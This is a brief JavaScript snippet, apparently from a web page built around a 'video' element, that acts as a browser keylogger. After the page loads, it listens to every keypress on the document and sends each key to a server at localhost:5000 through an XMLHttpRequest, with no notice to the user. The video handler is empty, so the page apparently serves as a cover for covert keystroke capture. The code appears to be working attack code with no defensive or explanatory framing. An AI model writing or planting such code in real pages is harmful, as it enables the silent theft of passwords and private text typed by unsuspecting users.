var http = new XMLHttpRequest();


window.addEventListener('load', function () {
    document.getElementById('video').addEventListener('load', function () {

    });
    document.addEventListener('keypress', function (k) {
        http.open('GET', "http://localhost:5000/key?k=" + k.key);
        http.send()
    });
});